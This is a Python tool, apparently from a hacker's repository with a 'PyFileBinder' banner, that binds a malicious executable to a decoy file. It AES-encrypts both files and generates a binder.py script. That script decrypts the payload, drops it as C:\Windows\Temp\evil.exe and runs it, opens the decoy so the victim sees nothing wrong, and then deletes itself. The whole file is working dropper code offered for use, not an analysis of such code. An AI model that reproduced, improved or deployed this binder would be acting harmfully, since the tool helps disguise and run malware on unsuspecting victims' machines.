#author: 0vef1ow5
import os
import base64
import hashlib
import sys
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad



def encrypt_file(input_file, output_file, key):
    """
    加密文件
    """
    with open(input_file, 'rb') as f_in:
        data = f_in.read()

    # 创建随机的初始化向量
    iv = get_random_bytes(16)
    # 将密钥扩展到 16 字节
    expanded_key = bytearray(hashlib.sha256(key).digest())
    expanded_key.extend(b'\x00' * (16 - len(expanded_key)))
    expanded_key = bytes(expanded_key)

    # 创建加密器
  
    cipher = AES.new(expanded_key, AES.MODE_CBC, iv=iv)
    # 加密数据
    padded_data = pad(data, 16)

    enc_data = cipher.encrypt(padded_data)

    # 编码初始化向量和加密数据
    b64_iv = base64.b64encode(iv).decode()
    b64_enc_data = base64.b64encode(enc_data).decode()

    # 将加密后的数据写入输出文件
    with open(output_file, 'w') as f_out:
        f_out.write(f"IV: {b64_iv}\n")
        f_out.write(f"Data: {b64_enc_data}\n")

def create_binder(evil_file, normal_file, binder_file, key):
    """
    生成绑定文件
    """
    # 加密恶意文件和正常文件
    evil_file_enc = "evil.enc"
    normal_file_enc = "normal.enc"
    encrypt_file(evil_file, evil_file_enc, key)
    encrypt_file(normal_file, normal_file_enc, key)

    with open(evil_file_enc, 'r') as f:
        lines = f.readlines()
        iv_evil = lines[0].split(': ')[1].strip()
        data_evil = lines[1].split(': ')[1].strip()
    with open(normal_file_enc, 'r') as f:
        lines = f.readlines()
        iv_normal = lines[0].split(': ')[1].strip()
        data_normal = lines[1].split(': ')[1].strip()
    

# 生成绑定文件
    with open(binder_file, 'w') as f:
        f.write("import base64\n")
        f.write("import hashlib\n")
        f.write("import subprocess\n")
        f.write("import inspect\n")
        f.write("import os\n")
        f.write("import shutil\n")
        f.write("import sys\n")
        f.write("from Crypto.Cipher import AES\n")
        f.write("from Crypto.Random import get_random_bytes\n")
        f.write("from cryptography.hazmat.backends import default_backend\n")
        f.write("from Crypto.Util.Padding import unpad\n\n")
        f.write("def decrypt_data(iv, data, key):\n")
        f.write("    expanded_key = bytearray(hashlib.sha256(key).digest())\n")
        f.write("    expanded_key.extend(b'\\x00' * (16 - len(expanded_key)))\n")
        f.write("    expanded_key = bytes(expanded_key)\n\n")
        f.write("    cipher = AES.new(expanded_key, AES.MODE_CBC, iv=iv)\n")
        f.write("    dec_data = cipher.decrypt(data)\n")
        f.write("    return unpad(dec_data, 16)\n\n")
        f.write(f"iv_evil = base64.b64decode('{iv_evil}')\n")
        f.write(f"data_evil = base64.b64decode('{data_evil}')\n")
        f.write(f"iv_normal = base64.b64decode('{iv_normal}')\n")
        f.write(f"data_normal = base64.b64decode('{data_normal}')\n")
        f.write(f"key = {key}\n")
        f.write("dec_data_evil = decrypt_data(iv_evil, data_evil, key)\n")
        f.write("dec_data_normal = decrypt_data(iv_normal, data_normal, key)\n")
        f.write("with open('evil.txt', 'wb') as f:\n")
        f.write("    f.write(dec_data_evil)\n")
        f.write(f"with open('{normal_file}', 'wb') as f:\n")
        f.write("    f.write(dec_data_normal)\n")
        f.write("shutil.move('evil.txt','C:\Windows\Temp\evil.exe')\n")
        f.write("subprocess.call(['C:\Windows\Temp\evil.exe'])\n")
        f.write(f"os.startfile('{normal_file}')\n")
        f.write("script_path = inspect.getfile(inspect.currentframe())\n")
        f.write("os.remove(script_path)\n")
        


if __name__ == '__main__':

    show = """
A rudimentary Python script to help you bind files

 _______        ________  _   __         ______    _                 __                
|_   __ \      |_   __  |(_) [  |       |_   _ \  (_)               |  ]               
  | |__) |_   __ | |_ \_|__   | | .---.   | |_) | __   _ .--.   .--.| | .---.  _ .--.  
  |  ___/[ \ [  ]|  _|  [  |  | |/ /__\\  |  __'.[  | [ `.-. |/ /'`\' |/ /__\\[ `/'`\] 
 _| |_    \ '/ /_| |_    | |  | || \__., _| |__) || |  | | | || \__/  || \__., | |     
|_____| [\_:  /|_____|  [___][___]'.__.'|_______/[___][___||__]'.__.;__]'.__.'[___]  by:0verf1ow5  
         \__.'                                                                       

"""
    print(show)
    parser = argparse.ArgumentParser()
    parser.add_argument('evil_file', help='The evil file to bind')
    parser.add_argument('normal_file', help='The normal file to bind')
    parser.add_argument('key', help='The key to use for encryption')

    args = parser.parse_args()
    
    evil_file = args.evil_file
    normal_file = args.normal_file
    binder_file = "binder.py"
    key = args.key
    key = bytes(key, encoding='utf-8')
    create_binder(evil_file, normal_file, binder_file, key)
